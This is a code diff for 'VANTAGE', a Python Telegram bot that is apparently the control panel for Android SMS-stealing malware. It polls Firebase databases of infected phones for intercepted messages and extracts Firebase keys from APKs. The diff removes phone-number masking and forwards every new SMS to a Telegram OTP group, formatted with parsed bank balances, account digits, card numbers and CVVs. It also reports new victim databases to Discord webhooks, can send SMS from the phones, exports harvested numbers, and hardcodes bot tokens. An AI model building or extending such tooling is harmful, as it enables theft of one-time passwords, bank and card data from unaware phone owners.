@@ -1,16 +1,23 @@
 #!/usr/bin/env python3
 """
-VANTAGE Telegram Bot - Admin Panel + User Panel
-Full featured with SMS forwarding to group, number masking, broadcast, lock system
+VANTAGE Bot v2.0 - Fixed + Advanced Features
+- Flood control fix
+- Multi Firebase support
+- Full numbers (no mask)
+- Real-time SMS only (no old)
+- Luxury group messages
+- Advanced admin panel
 """
 
 import os
+import io
 import json
 import time
 import base64
 import re
 import asyncio
 import logging
+import zipfile
 from datetime import datetime
 from typing import Optional, Dict, List, Any
 
@@ -21,16 +28,16 @@ from telegram.ext import (
     MessageHandler, filters, ContextTypes, ConversationHandler
 )
 from telegram.constants import ParseMode
+from telegram.error import RetryAfter, TelegramError
 
 # ============================================
-# CONFIGURATION - EDIT THESE
+# CONFIGURATION
 # ============================================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAEKICZ_3uFu8-p7r6RLkUK-Bp8317mbLHM")
-ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",")]
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAH5_sOvgZDjm23To9r1VYDdUEVK3npcZ6Y")
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",") if x.strip()]
 
-# Your channel/group where SMS will be forwarded
 SMS_GROUP_LINK = os.getenv("SMS_GROUP_LINK", "https://t.me/fire_x_otp_group")
-SMS_GROUP_ID = os.getenv("SMS_GROUP_ID", "-1003870313704")  # numeric chat id
+SMS_GROUP_ID = os.getenv("SMS_GROUP_ID", "-1003870313704")
 CHANNEL_LINK = os.getenv("CHANNEL_LINK", "https://t.me/THE_FIRE_X_NUMBER_CHANNEL")
 
 DISCORD_WEBHOOKS = [
@@ -38,14 +45,24 @@ DISCORD_WEBHOOKS = [
 ]
 
 DATA_FILE = "vantage_bot_data.json"
-POLL_INTERVAL = 3  # seconds
+POLL_INTERVAL = 5       # seconds between polls per account
+SEND_DELAY = 1.2        # seconds between group sends (avoid flood)
+MAX_SEND_RETRY = 3
 
 # States
-(MAIN_MENU, ADD_URL, ADD_KEY, VIEW_DEVICE, SEND_NUM, SEND_MSG,
- BC_TO, BC_MSG, BC_COUNT, LOCK_REASON, USER_SEARCH) = range(11)
+(MAIN_MENU, ADD_URL, ADD_KEY, SEND_NUM, SEND_MSG,
+ BC_TO, BC_MSG, BC_COUNT, LOCK_REASON, USER_ID_INPUT) = range(10)
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logging.getLogger("httpx").setLevel(logging.WARNING)  # silence httpx noise
 logger = logging.getLogger(__name__)
+
+# Global flood control
+_send_lock = asyncio.Lock()
+_last_send_time = 0
 
 
 # ============================================
@@ -55,17 +72,22 @@ def load_data() -> Dict:
     if os.path.exists(DATA_FILE):
         try:
             with open(DATA_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
+                d = json.load(f)
+                # Migrations
+                d.setdefault("accounts", {})
+                d.setdefault("user_sessions", {})
+                d.setdefault("locked_users", {})
+                d.setdefault("bot_locked", False)
+                d.setdefault("seen_msgs", {})
+                d.setdefault("broadcasts_sent", 0)
+                d.setdefault("user_registry", {})  # uid -> {username, first_seen}
+                return d
         except Exception:
             pass
     return {
-        "accounts": {},        # user_id -> [account objects]
-        "user_sessions": {},   # user_id -> {"account_id": X}
-        "locked_users": {},    # user_id -> {"reason": ..., "since": ...}
-        "bot_locked": False,   # global lock
-        "seen_msgs": {},       # device_id -> last seen msg key
-        "forwarded": [],       # recently forwarded (for dedupe)
-        "broadcasts_sent": 0,
+        "accounts": {}, "user_sessions": {}, "locked_users": {},
+        "bot_locked": False, "seen_msgs": {}, "broadcasts_sent": 0,
+        "user_registry": {},
     }
 
 
@@ -90,6 +112,17 @@ def is_locked(uid: int) -> bool:
     if DB.get("bot_locked") and not is_admin(uid):
         return True
     return str(uid) in DB.get("locked_users", {})
+
+
+def register_user(uid: int, username: str, name: str):
+    reg = DB.setdefault("user_registry", {})
+    if str(uid) not in reg:
+        reg[str(uid)] = {
+            "username": username or "",
+            "name": name or "",
+            "first_seen": datetime.now().isoformat(),
+        }
+        save_data(DB)
 
 
 # ============================================
@@ -212,16 +245,6 @@ def detect_bank(sender: str) -> str:
         if re.search(pat, sender, re.I):
             return name
     return "Bank"
-
-
-def mask_number(num: str) -> str:
-    """Mask all but first 6 digits: 989898***"""
-    if not num:
-        return "**********"
-    digits = re.sub(r'[^0-9]', '', num)
-    if len(digits) < 10:
-        return num
-    return digits[:6] + "***"
 
 
 def parse_bank_sms(text: str, sender: str) -> Optional[Dict]:
@@ -395,7 +418,6 @@ def parse_devices(raw: Dict) -> List[Dict]:
 # ============================================
 async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
     try:
-        import io, zipfile
         firebase_url = None
         api_key = None
         project_id = None
@@ -438,6 +460,35 @@ async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
 
 
 # ============================================
+# FLOOD-SAFE SEND
+# ============================================
+async def safe_send(app: Application, chat_id, text: str, **kwargs):
+    """Send message with flood control + auto-retry"""
+    global _last_send_time
+    async with _send_lock:
+        # Rate limiter
+        elapsed = time.time() - _last_send_time
+        if elapsed < SEND_DELAY:
+            await asyncio.sleep(SEND_DELAY - elapsed)
+        
+        for attempt in range(MAX_SEND_RETRY):
+            try:
+                msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
+                _last_send_time = time.time()
+                return msg
+            except RetryAfter as e:
+                wait = int(e.retry_after) + 1
+                logger.warning(f"Rate limit — waiting {wait}s")
+                await asyncio.sleep(wait)
+            except TelegramError as e:
+                logger.error(f"Send failed: {e}")
+                if attempt == MAX_SEND_RETRY - 1:
+                    return None
+                await asyncio.sleep(2)
+        return None
+
+
+# ============================================
 # DISCORD
 # ============================================
 async def send_discord(url: str, key: str, username: str = "Unknown"):
@@ -456,15 +507,12 @@ async def send_discord(url: str, key: str, username: str = "Unknown"):
             "title": "🔗 New Firebase Connection",
             "color": 0x5865F2,
             "fields": [
-                {"name": "📡 URL", "value": url, "inline": False},
-                {"name": "🔑 Key", "value": f"`{key[:40]}...`" if len(key) > 40 else f"`{key}`", "inline": False},
+                {"name": "📡 URL", "value": url[:100], "inline": False},
                 {"name": "👤 User", "value": username, "inline": True},
                 {"name": "📊 Total", "value": str(total), "inline": True},
                 {"name": "🟢 Online", "value": str(online), "inline": True},
-                {"name": "⚫ Offline", "value": str(total - online), "inline": True},
-                {"name": "⏰ Time", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False},
             ],
-            "footer": {"text": "VANTAGE Panel"},
+            "footer": {"text": "VANTAGE"},
             "timestamp": datetime.now().isoformat(),
         }]}
         async with aiohttp.ClientSession() as s:
@@ -506,41 +554,90 @@ def set_current(uid: int, acc_id: Optional[int]):
 
 
 # ============================================
-# SMS FORWARDER (background task)
+# FETCH HELPERS
 # ============================================
-FORWARDER_RUNNING = False
-
-
-async def fetch_all_devices_data(acc: Dict) -> List[Dict]:
-    """Fetch devices + SMS for an account"""
+async def fetch_devices_and_msgs(acc: Dict, only_online=True) -> List[Dict]:
+    """Fetch devices + their latest messages"""
     result = []
     try:
         raw = await fb_get(acc['url'], acc['key'], "clients")
         devices = parse_devices(raw)
         for dev in devices:
-            if not dev['status']:
+            if only_online and not dev['status']:
                 continue
             try:
                 raw_msgs = await fb_get(
                     acc['url'], acc['key'],
                     f"messages/{dev['id']}",
-                    {"orderBy": '"$key"', "limitToLast": "50"}
+                    {"orderBy": '"$key"', "limitToLast": "30"}
                 )
-                msgs = parse_messages(raw_msgs)
-                dev['messages'] = msgs
+                dev['messages'] = parse_messages(raw_msgs)
             except Exception:
                 dev['messages'] = []
             result.append(dev)
     except Exception as e:
-        logger.error(f"Fetch: {e}")
+        logger.error(f"Fetch error: {e}")
     return result
 
 
+async def fetch_all_online_devices(uid: int) -> List[Dict]:
+    """Fetch from ALL admin accounts"""
+    all_devs = []
+    for acc in get_accounts(uid):
+        try:
+            devs = await fetch_devices_and_msgs(acc, only_online=True)
+            for d in devs:
+                d['_account'] = acc['url']
+                d['_acc_id'] = acc['id']
+            all_devs.extend(devs)
+        except Exception:
+            pass
+    return all_devs
+
+
+async def fetch_all_numbers(uid: int) -> List[Dict]:
+    """Fetch ALL numbers from ALL online devices with metadata"""
+    numbers = {}
+    devs = await fetch_all_online_devices(uid)
+    for d in devs:
+        if d['phoneNumber'] and d['phoneNumber'] != '—':
+            num = re.sub(r'[^0-9]', '', d['phoneNumber'])
+            if len(num) >= 10:
+                numbers[num[-10:]] = {
+                    'number': num[-10:],
+                    'device': d['name'],
+                    'device_id': d['id'],
+                    'provider': d['provider'],
+                    'battery': d['battery'],
+                }
+        for m in d.get('messages', []):
+            for p in extract_phones(m['text']):
+                if p not in numbers:
+                    numbers[p] = {
+                        'number': p,
+                        'device': d['name'],
+                        'device_id': d['id'],
+                        'provider': d['provider'],
+                        'battery': d['battery'],
+                    }
+    return sorted(numbers.values(), key=lambda x: x['number'])
+
+
+# ============================================
+# SMS FORWARDER (Real-time only, no old)
+# ============================================
+FORWARDER_RUNNING = False
+
+
 async def forward_loop(app: Application):
-    """Continuously poll for new SMS across all accounts and forward to group"""
+    """Poll all accounts, forward only NEW messages"""
     global FORWARDER_RUNNING
     FORWARDER_RUNNING = True
     logger.info("📡 SMS Forwarder started")
+    
+    # On startup, mark all existing messages as "seen" without forwarding
+    # This prevents old messages from being sent
+    await initial_sync(app)
     
     while FORWARDER_RUNNING:
         try:
@@ -548,77 +645,149 @@ async def forward_loop(app: Application):
             for uid_str, accs in list(all_accounts.items()):
                 for acc in accs:
                     try:
-                        devices = await fetch_all_devices_data(acc)
+                        devices = await fetch_devices_and_msgs(acc, only_online=True)
                         for dev in devices:
                             acc_id = f"{acc['url']}|{dev['id']}"
                             seen = DB.get('seen_msgs', {})
                             last_seen_key = seen.get(acc_id)
                             
                             new_msgs = []
-                            for m in dev['messages']:
+                            for m in dev.get('messages', []):
                                 if last_seen_key and m['key'] <= last_seen_key:
+                                    continue
+                                if not last_seen_key:
+                                    # First time seeing this device — mark all as seen, don't forward
                                     continue
                                 new_msgs.append(m)
                             
-                            if dev['messages']:
+                            if dev.get('messages'):
                                 seen[acc_id] = dev['messages'][-1]['key']
                                 DB['seen_msgs'] = seen
-                                save_data(DB)
                             
                             for m in new_msgs:
                                 await forward_sms_to_group(app, dev, m)
+                                await asyncio.sleep(0.5)
+                        
+                        save_data(DB)
                     except Exception as e:
-                        logger.error(f"Forward loop: {e}")
+                        logger.error(f"Forward: {e}")
+                    await asyncio.sleep(1)
         except Exception as e:
-            logger.error(f"Outer loop: {e}")
-        
+            logger.error(f"Loop: {e}")
         await asyncio.sleep(POLL_INTERVAL)
 
 
+async def initial_sync(app: Application):
+    """Mark existing messages as seen so we don't flood group with old SMS"""
+    logger.info("🔄 Initial sync — marking existing messages as seen...")
+    all_accounts = DB.get('accounts', {})
+    seen = DB.get('seen_msgs', {})
+    
+    for uid_str, accs in all_accounts.items():
+        for acc in accs:
+            try:
+                devices = await fetch_devices_and_msgs(acc, only_online=True)
+                for dev in devices:
+                    acc_id = f"{acc['url']}|{dev['id']}"
+                    if dev.get('messages'):
+                        seen[acc_id] = dev['messages'][-1]['key']
+            except Exception:
+                pass
+    
+    DB['seen_msgs'] = seen
+    save_data(DB)
+    logger.info("✅ Initial sync complete")
+
+
+def build_luxury_sms(dev: Dict, msg: Dict) -> str:
+    """Build luxury formatted SMS message"""
+    sender = msg.get('sender', 'Unknown')
+    text = msg.get('text', '')
+    time_str = msg.get('time', '')
+    
+    phone = dev['phoneNumber']
+    if not phone or phone == '—':
+        phones = extract_phones(text)
+        phone = phones[0] if phones else '—'
+    
+    # Detect type
+    bank = parse_bank_sms(text, sender)
+    card = parse_card_sms(text)
+    
+    if card:
+        icon = "💳"
+        category = "CARD"
+    elif bank:
+        icon = "🏦"
+        category = "BANK"
+    else:
+        icon = "📩"
+        category = "SMS"
+    
+    # Header
+    lines = [
+        f"╔══════════════════════",
+        f"║ {icon} **{category} MESSAGE**",
+        f"╠══════════════════════",
+        f"║ 📱 **Device:** {dev['name'][:25]}",
+        f"║ 📞 **Number:** `{phone}`",
+        f"║ 👤 **From:** `{sender}`",
+    ]
+    if time_str:
+        lines.append(f"║ ⏰ **Time:** {time_str}")
+    
+    if dev.get('provider'):
+        lines.append(f"║ 🌐 **Network:** {dev['provider']}")
+    if dev.get('battery'):
+        lines.append(f"║ 🔋 **Battery:** {dev['battery']}")
+    
+    lines.append("╠══════════════════════")
+    
+    # Body
+    lines.append(f"║ 💬 **Message:**")
+    lines.append(f"║")
+    # Wrap text
+    wrapped = text[:3500]
+    for line in wrapped.split('\n'):
+        lines.append(f"║ {line}")
+    
+    # Bank details
+    if bank:
+        lines.append("╠══════════════════════")
+        lines.append(f"║ 💰 **Balance:** ₹{bank['availableBalance']:,.2f}")
+        if bank.get('transactionAmount'):
+            sign = "＋" if bank['transactionType'] == 'credit' else "－"
+            lines.append(f"║ {sign} **Amount:** ₹{bank['transactionAmount']:,.2f}")
+            lines.append(f"║ 📊 **Type:** {bank['transactionType'].upper()}")
+        if bank.get('accountLast4'):
+            lines.append(f"║ 🔢 **A/C:** ****{bank['accountLast4']}")
+    
+    # Card details
+    if card:
+        lines.append("╠══════════════════════")
+        lines.append(f"║ 💳 **Card:** {card['cardType'] or 'Unknown'}")
+        lines.append(f"║ 🔢 **Number:** **** **** **** {card['cardLast4']}")
+        if card.get('cvv'):
+            lines.append(f"║ 🔐 **CVV:** `{card['cvv']}`")
+        if card.get('expiry'):
+            lines.append(f"║ 📅 **Expiry:** {card['expiry']}")
+    
+    lines.append("╚══════════════════════")
+    return "\n".join(lines)
+
+
 async def forward_sms_to_group(app: Application, dev: Dict, msg: Dict):
-    """Forward a single SMS to the group"""
+    """Forward ONE new SMS with luxury UI"""
     try:
-        sender = msg.get('sender', 'Unknown')
-        text = msg.get('text', '')
-        time_str = msg.get('time', '')
+        body = build_luxury_sms(dev, msg)
         
-        phone = dev['phoneNumber']
-        if not phone or phone == '—':
-            phones = extract_phones(text)
-            phone = phones[0] if phones else '—'
-        
-        masked = mask_number(phone)
-        
-        # Build message
-        header = f"📱 `{masked}`"
-        if dev.get('name'):
-            header += f" • {dev['name'][:20]}"
-        
-        body = f"{header}\n"
-        body += f"👤 Sender: `{sender}`\n"
-        if time_str:
-            body += f"⏰ {time_str}\n"
-        body += f"\n{text[:3500]}"
-        
-        # Bank info if detected
-        bank = parse_bank_sms(text, sender)
-        if bank:
-            body += f"\n\n🏦 *{bank['bankName']}*"
-            body += f"\n💰 ₹{bank['availableBalance']:,.2f}"
-            if bank.get('transactionType'):
-                sign = "+" if bank['transactionType'] == 'credit' else "-"
-                if bank.get('transactionAmount'):
-                    body += f"\n📊 {sign}₹{bank['transactionAmount']:,.2f}"
-        
-        # Send to group
         keyboard = InlineKeyboardMarkup([[
             InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
             InlineKeyboardButton("👥 SMS Group", url=SMS_GROUP_LINK),
         ]])
         
-        await app.bot.send_message(
-            chat_id=SMS_GROUP_ID,
-            text=body,
+        await safe_send(
+            app, SMS_GROUP_ID, body,
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=keyboard,
             disable_web_page_preview=True,
@@ -630,71 +799,65 @@ async def forward_sms_to_group(app: Application, dev: Dict, msg: Dict):
 # ============================================
 # UI BUILDERS
 # ============================================
-async def build_admin_menu(uid: int) -> tuple:
-    """Build admin main menu"""
+async def build_admin_menu(uid: int):
     accounts = get_accounts(uid)
     current = get_current(uid)
     
-    # Count stats across ALL admin accounts
-    total_devices = 0
-    online_devices = 0
+    total_online = 0
     total_numbers = 0
-    
-    for acc in accounts:
-        try:
-            devices = await fetch_all_devices_data(acc)
-            total_devices += len(devices)
-            online_devices += sum(1 for d in devices if d['status'])
-            nums = set()
-            for d in devices:
-                if d['phoneNumber'] and d['phoneNumber'] != '—':
-                    nums.add(d['phoneNumber'])
-                for m in d.get('messages', []):
-                    for p in extract_phones(m['text']):
-                        nums.add(p)
-            total_numbers += len(nums)
-        except Exception:
-            pass
+    try:
+        devs = await fetch_all_online_devices(uid)
+        total_online = len(devs)
+        nums = await fetch_all_numbers(uid)
+        total_numbers = len(nums)
+    except Exception:
+        pass
     
     bot_locked = DB.get('bot_locked', False)
     locked_count = len(DB.get('locked_users', {}))
+    total_users = len(DB.get('user_registry', {}))
     
     text = (
-        f"👑 *VANTAGE ADMIN PANEL*\n\n"
-        f"📡 Accounts: *{len(accounts)}*\n"
-        f"📱 Devices: *{total_devices}* (🟢 {online_devices} online)\n"
-        f"📞 Numbers: *{total_numbers}*\n"
-        f"🔒 Bot: {'🔴 LOCKED' if bot_locked else '🟢 Active'}\n"
-        f"👥 Locked Users: {locked_count}\n"
+        f"👑 **VANTAGE ADMIN PANEL**\n\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"📡 Accounts: **{len(accounts)}**\n"
+        f"🟢 Online Devices: **{total_online}**\n"
+        f"📞 Total Numbers: **{total_numbers}**\n"
+        f"👥 Total Users: **{total_users}**\n"
+        f"🔒 Locked Users: **{locked_count}**\n"
+        f"🤖 Bot Status: {'🔴 LOCKED' if bot_locked else '🟢 Active'}\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
     )
     if current:
-        text += f"\n✅ Current: `{current['url']}`"
+        text += f"\n✅ Current: `{current['url'][:40]}`"
     
     kb = []
     if current:
-        kb.append([InlineKeyboardButton("📱 Online Devices", callback_data="admin_devices")])
-        kb.append([InlineKeyboardButton("📞 All Numbers", callback_data="admin_numbers")])
-        kb.append([InlineKeyboardButton("🏦 Bank Info", callback_data="admin_bank")])
-        kb.append([InlineKeyboardButton("💳 Cards", callback_data="admin_cards")])
-        kb.append([InlineKeyboardButton("📤 Send SMS", callback_data="admin_send")])
-        kb.append([InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")])
-    kb.append([InlineKeyboardButton("➕ Add Account", callback_data="add_account")])
-    if accounts:
-        kb.append([InlineKeyboardButton("📁 My Accounts", callback_data="admin_accounts")])
+        kb.append([InlineKeyboardButton("📱 Online Devices", callback_data="admin_devices"),
+                   InlineKeyboardButton("📞 All Numbers", callback_data="admin_numbers")])
+        kb.append([InlineKeyboardButton("🏦 Bank Info", callback_data="admin_bank"),
+                   InlineKeyboardButton("💳 Cards", callback_data="admin_cards")])
+        kb.append([InlineKeyboardButton("📤 Send SMS", callback_data="admin_send"),
+                   InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")])
+    
+    kb.append([InlineKeyboardButton("➕ Add Account", callback_data="add_account"),
+               InlineKeyboardButton("📁 My Accounts", callback_data="admin_accounts")])
     
     kb.append([InlineKeyboardButton(
         "🔓 Unlock Bot" if bot_locked else "🔒 Lock Bot",
         callback_data="toggle_lock"
     )])
+    
     kb.append([InlineKeyboardButton("👥 User Management", callback_data="admin_users")])
-    kb.append([InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")])
-    kb.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
+    kb.append([InlineKeyboardButton("📤 Export All Numbers", callback_data="admin_export")])
+    kb.append([InlineKeyboardButton("🗑 Remove Firebase", callback_data="admin_remove_fb")])
+    kb.append([InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
+               InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
     
     return text, InlineKeyboardMarkup(kb)
 
 
-async def build_user_menu(uid: int) -> tuple:
-    """Build normal user menu - only shows numbers"""
+async def build_user_menu(uid: int):
     accounts = get_accounts(uid)
     current = get_current(uid)
     
@@ -703,34 +866,31 @@ async def build_user_menu(uid: int) -> tuple:
         current = accounts[0]
     
     if not current:
-        return ("❌ No account connected.\n\nContact admin for access.",
-                InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]]))
+        return (
+            "❌ **No account connected**\n\nContact admin for access.",
+            InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]])
+        )
     
-    # Fetch only online devices + their numbers
     try:
-        devices = await fetch_all_devices_data(current)
-        online = [d for d in devices if d['status']]
-        
-        numbers = set()
-        for d in online:
-            if d['phoneNumber'] and d['phoneNumber'] != '—':
-                numbers.add(d['phoneNumber'])
-            for m in d.get('messages', []):
-                for p in extract_phones(m['text']):
-                    numbers.add(p)
+        devs = await fetch_devices_and_msgs(current, only_online=True)
+        numbers = await fetch_all_numbers(uid)
         
         text = (
-            f"📱 *VANTAGE*\n\n"
-            f"🟢 Online Devices: *{len(online)}*\n"
-            f"📞 Total Numbers: *{len(numbers)}*\n\n"
+            f"📱 **VANTAGE**\n\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🟢 Online Devices: **{len(devs)}**\n"
+            f"📞 Total Numbers: **{len(numbers)}**\n"
+            f"━━━━━━━━━━━━━━━━━━━\n\n"
         )
         
         if numbers:
-            text += "📋 *Available Numbers:*\n\n"
-            for i, num in enumerate(sorted(numbers)[:50], 1):
-                text += f"{i}. `{mask_number(num)}`\n"
+            text += "📋 **Available Numbers:**\n\n"
+            for i, n in enumerate(numbers[:50], 1):
+                text += f"`{i}.` **{n['number']}**\n"
+            if len(numbers) > 50:
+                text += f"\n_...and {len(numbers) - 50} more_"
         else:
-            text += "_No numbers available yet_\n"
+            text += "_No numbers available_"
         
         kb = InlineKeyboardMarkup([
             [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
@@ -739,8 +899,7 @@ async def build_user_menu(uid: int) -> tuple:
         ])
         return text, kb
     except Exception as e:
-        return (f"❌ Error: {e}",
-                InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]]))
+        return (f"❌ Error: {e}", InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data="refresh")]]))
 
 
 async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -748,10 +907,11 @@ async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if is_locked(uid):
         reason = DB.get('locked_users', {}).get(str(uid), {}).get('reason', 'Access denied')
-        await (update.message.reply_text if update.message else update.callback_query.edit_message_text)(
-            f"🔒 *Access Denied*\n\n{reason}\n\nContact admin.",
-            parse_mode='Markdown'
-        )
+        msg = f"🔒 **Access Denied**\n\n{reason}\n\nContact admin."
+        if update.message:
+            await update.message.reply_text(msg, parse_mode='Markdown')
+        else:
+            await update.callback_query.edit_message_text(msg, parse_mode='Markdown')
         return
     
     if is_admin(uid):
@@ -773,34 +933,8 @@ async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============================================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
+    register_user(uid, update.effective_user.username, update.effective_user.full_name)
     context.user_data.clear()
-    
-    # Handle share deep link
-    args = context.args
-    if args and args[0].startswith("share_"):
-        try:
-            payload = args[0][6:]
-            decoded = base64.b64decode(payload).decode()
-            parts = decoded.split("|||")
-            if len(parts) >= 2:
-                url, key = parts[0], parts[1]
-                expiry = int(parts[2]) if len(parts) > 2 else 0
-                if expiry and time.time() * 1000 > expiry:
-                    await update.message.reply_text("❌ Share link expired.")
-                    return
-                accs = get_accounts(uid)
-                if not any(a['url'] == url for a in accs):
-                    accs.append({
-                        'id': int(time.time() * 1000),
-                        'url': url, 'key': key,
-                        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                    })
-                    save_accounts(uid, accs)
-                set_current(uid, accs[-1]['id'])
-                await update.message.reply_text("✅ Account imported from share link!")
-        except Exception:
-            pass
-    
     await show_menu(update, context)
     return MAIN_MENU
 
@@ -812,25 +946,20 @@ async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if is_admin(uid):
+    if is_admin(update.effective_user.id):
         text = (
-            "👑 *Admin Commands*\n\n"
-            "/start - Admin panel\n"
-            "/lock - Lock bot for all users\n"
-            "/unlock - Unlock bot\n"
-            "/lockuser <id> [reason] - Lock a user\n"
-            "/unlockuser <id> - Unlock a user\n"
-            "/stats - Bot statistics\n"
-            "/broadcast - Send broadcast\n"
-            "/cancel - Cancel\n"
+            "👑 **Admin Commands**\n\n"
+            "/start — Admin panel\n"
+            "/lock — Lock bot globally\n"
+            "/unlock — Unlock bot\n"
+            "/lockuser `<id>` [reason] — Lock user\n"
+            "/unlockuser `<id>` — Unlock user\n"
+            "/stats — Bot statistics\n"
+            "/users — List all users\n"
+            "/cancel — Cancel\n"
         )
     else:
-        text = (
-            "🤖 *VANTAGE Bot*\n\n"
-            "/start - Main menu\n"
-            "/refresh - Refresh numbers\n"
-        )
+        text = "🤖 **VANTAGE Bot**\n\n/start — Main menu\n/refresh — Refresh numbers"
     await update.message.reply_text(text, parse_mode='Markdown')
 
 
@@ -839,7 +968,7 @@ async def cmd_lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     DB['bot_locked'] = True
     save_data(DB)
-    await update.message.reply_text("🔒 Bot LOCKED for all non-admin users.")
+    await update.message.reply_text("🔒 Bot LOCKED globally.")
 
 
 async def cmd_unlock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -854,14 +983,14 @@ async def cmd_lock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         return
     if not context.args:
-        await update.message.reply_text("Usage: /lockuser <user_id> [reason]")
+        await update.message.reply_text("Usage: `/lockuser <id> [reason]`", parse_mode='Markdown')
         return
     try:
         target = int(context.args[0])
     except ValueError:
-        await update.message.reply_text("❌ Invalid user ID")
+        await update.message.reply_text("❌ Invalid ID")
         return
-    reason = " ".join(context.args[1:]) or "Access revoked by admin"
+    reason = " ".join(context.args[1:]) or "Access revoked"
     DB.setdefault('locked_users', {})[str(target)] = {
         'reason': reason,
         'since': datetime.now().isoformat(),
@@ -874,7 +1003,6 @@ async def cmd_unlock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         return
     if not context.args:
-        await update.message.reply_text("Usage: /unlockuser <user_id>")
         return
     try:
         target = int(context.args[0])
@@ -891,263 +1019,219 @@ async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     all_accs = DB.get('accounts', {})
     total_accounts = sum(len(a) for a in all_accs.values())
     text = (
-        f"📊 *BOT STATISTICS*\n\n"
-        f"👥 Total Users: *{len(all_accs)}*\n"
-        f"📡 Total Accounts: *{total_accounts}*\n"
-        f"🔒 Locked Users: *{len(DB.get('locked_users', {}))}*\n"
-        f"🚫 Bot Locked: *{'Yes' if DB.get('bot_locked') else 'No'}*\n"
-        f"📤 Broadcasts: *{DB.get('broadcasts_sent', 0)}*\n"
+        f"📊 **BOT STATISTICS**\n\n"
+        f"👥 Users: **{len(DB.get('user_registry', {}))}**\n"
+        f"📡 Accounts: **{total_accounts}**\n"
+        f"🔒 Locked Users: **{len(DB.get('locked_users', {}))}**\n"
+        f"🚫 Bot Locked: **{'Yes' if DB.get('bot_locked') else 'No'}**\n"
+        f"📤 Broadcasts: **{DB.get('broadcasts_sent', 0)}**\n"
     )
     await update.message.reply_text(text, parse_mode='Markdown')
 
 
-# ============================================
-# CALLBACK HANDLER (Admin)
-# ============================================
-async def admin_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
-        await query.edit_message_text("❌ No active account.")
-        return MAIN_MENU
-    
-    try:
-        devices = await fetch_all_devices_data(current)
-        online = [d for d in devices if d['status']]
-        
-        if not online:
-            await query.edit_message_text("📭 No online devices.")
-            return MAIN_MENU
-        
-        text = f"🟢 *Online Devices* ({len(online)})\n\n"
-        kb = []
-        for d in online[:25]:
-            num = d['phoneNumber'] if d['phoneNumber'] != '—' else '—'
-            text += f"• *{d['name'][:25]}*\n"
-            text += f"  🔋{d['battery']} | 📞`{mask_number(num)}`\n\n"
-            kb.append([InlineKeyboardButton(
-                f"{d['name'][:28]} ({d['battery']})",
-                callback_data=f"adev_{d['id']}"
-            )])
-        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
-        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-    except Exception as e:
-        await query.edit_message_text(f"❌ Error: {e}")
-    return MAIN_MENU
-
-
-async def admin_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
-        await query.edit_message_text("❌ No active account.")
-        return MAIN_MENU
-    try:
-        devices = await fetch_all_devices_data(current)
-        numbers = set()
-        for d in devices:
-            if not d['status']:
-                continue
-            if d['phoneNumber'] and d['phoneNumber'] != '—':
-                numbers.add(d['phoneNumber'])
-            for m in d.get('messages', []):
-                for p in extract_phones(m['text']):
-                    numbers.add(p)
-        if not numbers:
-            await query.edit_message_text("📭 No numbers found.")
-            return MAIN_MENU
-        text = f"📞 *All Numbers* ({len(numbers)})\n\n"
-        for i, n in enumerate(sorted(numbers)[:80], 1):
-            text += f"{i}. `{mask_number(n)}`\n"
-        await query.edit_message_text(
-            text,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]),
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        await query.edit_message_text(f"❌ Error: {e}")
-    return MAIN_MENU
-
-
